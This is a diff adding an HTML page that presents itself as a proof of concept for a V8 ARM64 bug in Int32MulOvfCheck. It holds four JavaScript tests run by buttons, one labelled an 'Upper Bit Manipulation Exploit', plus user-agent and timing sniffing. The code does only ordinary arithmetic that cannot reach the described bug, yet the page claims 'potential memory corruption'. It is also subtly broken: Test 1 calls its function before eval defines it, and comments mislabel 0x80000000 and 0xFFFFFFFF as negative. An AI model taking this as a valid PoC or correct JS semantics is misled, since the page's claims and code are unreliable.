@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>V8 Int32MulOvfCheck Bug POC</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+            color: #ffffff;
+        }
+        .container {
+            background-color: #2d2d2d;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .header {
+            background-color: #ff4444;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .test-case {
+            background-color: #333333;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 4px solid #00ff00;
+        }
+        .vulnerable {
+            border-left-color: #ff4444;
+        }
+        .result {
+            background-color: #1a1a1a;
+            padding: 10px;
+            border-radius: 3px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .success {
+            color: #00ff00;
+        }
+        .error {
+            color: #ff4444;
+        }
+        .warning {
+            color: #ffaa00;
+        }
+        button {
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #0088ff;
+        }
+        .code {
+            background-color: #1a1a1a;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+        }
+        .exploit-info {
+            background-color: #444444;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 4px solid #ffaa00;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🐛 V8 Int32MulOvfCheck Bug POC</h1>
+        <p><strong>CVE/Bug ID:</strong> 445380761</p>
+        <p><strong>Commit:</strong> 11457dc1050dfbb409854412bbdb94af34033016</p>
+        <p><strong>Description:</strong> Upper 32-bit of Int32MulOvfCheck are not zeroed on ARM64</p>
+    </div>
+
+    <div class="container">
+        <h2>Bug Analysis</h2>
+        <div class="exploit-info">
+            <h3>Technical Details:</h3>
+            <p>• ARM64 doesn't have flag-setting 32-bit multiplication</p>
+            <p>• V8 uses 64-bit multiplication and compares result.X() and result.W()</p>
+            <p>• This leads to upper 32-bit not being properly zeroed</p>
+            <p>• Can cause incorrect overflow detection and unexpected behavior</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>Test Cases</h2>
+        
+        <div class="test-case">
+            <h3>Test 1: Integer Multiplication Overflow Detection</h3>
+            <p>This test attempts to trigger the Int32MulOvfCheck optimization with values that may overflow.</p>
+            <div class="code" id="test1-code">
+function testInt32MulOverflow() {
+    const maxInt32 = 0x7FFFFFFF;  // 2^31 - 1
+    const testValue = 0x40000000; // 2^30
+    
+    // Force multiplication that could trigger overflow check
+    let result = testValue * 2;
+    let result2 = (testValue | 0) * 2; // Force int32
+    
+    // Check if upper bits are properly handled
+    let upperBits = (result >>> 0) !== (result | 0);
+    
+    return {
+        testValue: testValue,
+        result: result,
+        result2: result2,
+        upperBitsInconsistent: upperBits,
+        expectedOverflow: result > maxInt32
+    };
+}
+            </div>
+            <button onclick="runTest1()">Run Test 1</button>
+            <div class="result" id="test1-result"></div>
+        </div>
+
+        <div class="test-case">
+            <h3>Test 2: Optimized Loop Multiplication</h3>
+            <p>Force V8 to optimize multiplication in a hot loop to trigger compiler optimization.</p>
+            <div class="code" id="test2-code">
+function testOptimizedMultiplication() {
+    // Force optimization with hot loop
+    function hotMul(a, b) {
+        return (a | 0) * (b | 0); // Force int32 path
+    }
+    
+    // Warm up the function
+    for(let i = 0; i < 10000; i++) {
+        hotMul(i, 2);
+    }
+    
+    // Test edge cases after optimization
+    const tests = [
+        { a: 0x40000000, b: 2 },
+        { a: 0x20000000, b: 4 },
+        { a: 0x7FFFFFFF, b: 1 },
+        { a: 0x3FFFFFFF, b: 3 }
+    ];
+    
+    return tests.map(test => {
+        let result = hotMul(test.a, test.b);
+        let expected = test.a * test.b;
+        let matches = (result | 0) === (expected | 0);
+        
+        return {
+            input: test,
+            result: result,
+            expected: expected,
+            matches: matches,
+            resultHex: '0x' + result.toString(16),
+            expectedHex: '0x' + expected.toString(16)
+        };
+    });
+}
+            </div>
+            <button onclick="runTest2()">Run Test 2</button>
+            <div class="result" id="test2-result"></div>
+        </div>
+
+        <div class="test-case vulnerable">
+            <h3>Test 3: Upper Bit Manipulation Exploit</h3>
+            <p>Attempt to exploit the upper bit handling issue for potential memory corruption.</p>
+            <div class="code" id="test3-code">
+function testUpperBitExploit() {
+    // Create scenarios where upper 32 bits matter
+    function exploitMul(a, b) {
+        // Force int32 multiplication with overflow check
+        let result = Math.imul(a, b); // 32-bit multiplication
+        let result64 = a * b;         // 64-bit multiplication
+        
+        // Check if results differ in unexpected ways
+        let diff = result64 - result;
+        let upperBits = Math.floor(result64 / 0x100000000);
+        
+        return {
+            result32: result,
+            result64: result64,
+            difference: diff,
+            upperBits: upperBits,
+            suspicious: diff !== 0 && upperBits !== 0
+        };
+    }
+    
+    const testCases = [
+        { a: 0x80000000, b: 2 },     // -2^31 * 2
+        { a: 0x7FFFFFFF, b: 2 },     // (2^31-1) * 2  
+        { a: 0x40000001, b: 2 },     // Odd number * 2
+        { a: 0xFFFFFFFF, b: 1 },     // -1 * 1 (as unsigned)
+        { a: 0x12345678, b: 0x9ABCDEF0 } // Large numbers
+    ];
+    
+    return testCases.map(test => exploitMul(test.a, test.b));
+}
+            </div>
+            <button onclick="runTest3()">Run Test 3</button>
+            <div class="result" id="test3-result"></div>
+        </div>
+
+        <div class="test-case">
+            <h3>Test 4: Architecture Detection & Timing Attack</h3>
+            <p>Detect ARM64 and measure timing differences that might indicate the bug.</p>
+            <div class="code" id="test4-code">
+function testArchitectureAndTiming() {
+    // Simple architecture detection
+    const isARM = /arm/i.test(navigator.userAgent) || 
+                  /aarch64/i.test(navigator.userAgent) ||
+                  navigator.platform.includes('arm');
+    
+    // Timing attack to detect optimization differences
+    function timeMul(iterations = 100000) {
+        const start = performance.now();
+        let sum = 0;
+        
+        for(let i = 0; i < iterations; i++) {
+            // Force int32 multiplication that triggers overflow check
+            sum += (0x40000000 * 2) | 0;
+        }
+        
+        const end = performance.now();
+        return { time: end - start, result: sum };
+    }
+    
+    // Run multiple timing tests
+    const timingResults = [];
+    for(let i = 0; i < 5; i++) {
+        timingResults.push(timeMul());
+    }
+    
+    const avgTime = timingResults.reduce((sum, r) => sum + r.time, 0) / timingResults.length;
+    
+    return {
+        possibleARM: isARM,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        timingResults: timingResults,
+        averageTime: avgTime,
+        suspiciousVariation: Math.max(...timingResults.map(r => r.time)) - Math.min(...timingResults.map(r => r.time)) > 10
+    };
+}
+            </div>
+            <button onclick="runTest4()">Run Test 4</button>
+            <div class="result" id="test4-result"></div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>All Tests</h2>
+        <button onclick="runAllTests()" style="background-color: #ff6600;">🚀 Run All Tests</button>
+        <button onclick="clearResults()" style="background-color: #666666;">Clear Results</button>
+        
+        <div class="exploit-info">
+            <h3>Expected Behavior on Vulnerable Systems:</h3>
+            <p>• Inconsistent results between 32-bit and 64-bit multiplication</p>
+            <p>• Upper 32 bits not properly zeroed in overflow checks</p>
+            <p>• Potential for memory corruption or unexpected behavior</p>
+            <p>• Different timing characteristics on ARM64 vs x86_64</p>
+        </div>
+    </div>
+
+    <script>
+        function runTest1() {
+            const resultDiv = document.getElementById('test1-result');
+            resultDiv.innerHTML = '<span class="warning">Running Test 1...</span>';
+            
+            try {
+                const result = testInt32MulOverflow();
+                
+                let html = '<h4>Test 1 Results:</h4>';
+                html += `<p>Test Value: 0x${result.testValue.toString(16)}</p>`;
+                html += `<p>Result: ${result.result} (0x${result.result.toString(16)})</p>`;
+                html += `<p>Result2 (forced int32): ${result.result2} (0x${result.result2.toString(16)})</p>`;
+                html += `<p>Upper Bits Inconsistent: <span class="${result.upperBitsInconsistent ? 'error' : 'success'}">${result.upperBitsInconsistent}</span></p>`;
+                html += `<p>Expected Overflow: <span class="${result.expectedOverflow ? 'warning' : 'success'}">${result.expectedOverflow}</span></p>`;
+                
+                resultDiv.innerHTML = html;
+                
+                // Include the actual function
+                eval(document.getElementById('test1-code').textContent);
+                
+            } catch (e) {
+                resultDiv.innerHTML = `<span class="error">Error: ${e.message}</span>`;
+            }
+        }
+
+        function runTest2() {
+            const resultDiv = document.getElementById('test2-result');
+            resultDiv.innerHTML = '<span class="warning">Running Test 2...</span>';
+            
+            try {
+                // Include the actual function
+                eval(document.getElementById('test2-code').textContent);
+                const results = testOptimizedMultiplication();
+                
+                let html = '<h4>Test 2 Results:</h4>';
+                results.forEach((result, index) => {
+                    html += `<div style="margin: 10px 0; padding: 10px; background-color: #1a1a1a;">`;
+                    html += `<p><strong>Test ${index + 1}:</strong> ${result.input.a} * ${result.input.b}</p>`;
+                    html += `<p>Result: ${result.result} (${result.resultHex})</p>`;
+                    html += `<p>Expected: ${result.expected} (${result.expectedHex})</p>`;
+                    html += `<p>Match: <span class="${result.matches ? 'success' : 'error'}">${result.matches}</span></p>`;
+                    html += `</div>`;
+                });
+                
+                resultDiv.innerHTML = html;
+            } catch (e) {
+                resultDiv.innerHTML = `<span class="error">Error: ${e.message}</span>`;
+            }
+        }
+
+        function runTest3() {
+            const resultDiv = document.getElementById('test3-result');
+            resultDiv.innerHTML = '<span class="warning">Running Test 3...</span>';
+            
+            try {
+                // Include the actual function
+                eval(document.getElementById('test3-code').textContent);
+                const results = testUpperBitExploit();
+                
+                let html = '<h4>Test 3 Results (Potential Exploit):</h4>';
+                results.forEach((result, index) => {
+                    html += `<div style="margin: 10px 0; padding: 10px; background-color: #1a1a1a;">`;
+                    html += `<p><strong>Test ${index + 1}:</strong></p>`;
+                    html += `<p>32-bit result: ${result.result32}</p>`;
+                    html += `<p>64-bit result: ${result.result64}</p>`;
+                    html += `<p>Difference: ${result.difference}</p>`;
+                    html += `<p>Upper bits: 0x${result.upperBits.toString(16)}</p>`;
+                    html += `<p>Suspicious: <span class="${result.suspicious ? 'error' : 'success'}">${result.suspicious}</span></p>`;
+                    html += `</div>`;
+                });
+                
+                resultDiv.innerHTML = html;
+            } catch (e) {
+                resultDiv.innerHTML = `<span class="error">Error: ${e.message}</span>`;
+            }
+        }
+
+        function runTest4() {
+            const resultDiv = document.getElementById('test4-result');
+            resultDiv.innerHTML = '<span class="warning">Running Test 4...</span>';
+            
+            try {
+                // Include the actual function
+                eval(document.getElementById('test4-code').textContent);
+                const result = testArchitectureAndTiming();
+                
+                let html = '<h4>Test 4 Results (Architecture & Timing):</h4>';
+                html += `<p>Possible ARM: <span class="${result.possibleARM ? 'warning' : 'success'}">${result.possibleARM}</span></p>`;
+                html += `<p>User Agent: ${result.userAgent}</p>`;
+                html += `<p>Platform: ${result.platform}</p>`;
+                html += `<p>Average Time: ${result.averageTime.toFixed(3)}ms</p>`;
+                html += `<p>Suspicious Timing Variation: <span class="${result.suspiciousVariation ? 'warning' : 'success'}">${result.suspiciousVariation}</span></p>`;
+                
+                html += '<h5>Individual Timing Results:</h5>';
+                result.timingResults.forEach((timing, index) => {
+                    html += `<p>Run ${index + 1}: ${timing.time.toFixed(3)}ms</p>`;
+                });
+                
+                resultDiv.innerHTML = html;
+            } catch (e) {
+                resultDiv.innerHTML = `<span class="error">Error: ${e.message}</span>`;
+            }
+        }
+
+        function runAllTests() {
+            runTest1();
+            setTimeout(() => runTest2(), 100);
+            setTimeout(() => runTest3(), 200);
+            setTimeout(() => runTest4(), 300);
+        }
+
+        function clearResults() {
+            ['test1-result', 'test2-result', 'test3-result', 'test4-result'].forEach(id => {
+                document.getElementById(id).innerHTML = '';
+            });
+        }
+
+        // Auto-run basic detection on page load
+        window.onload = function() {
+            console.log('V8 Int32MulOvfCheck Bug POC loaded');
+            console.log('Commit: 11457dc1050dfbb409854412bbdb94af34033016');
+            console.log('Bug ID: 445380761');
+            
+            // Basic environment info
+            console.log('User Agent:', navigator.userAgent);
+            console.log('Platform:', navigator.platform);
+            console.log('JavaScript Engine:', typeof V8 !== 'undefined' ? 'V8' : 'Unknown');
+        };
+    </script>
+</body>
+</html>
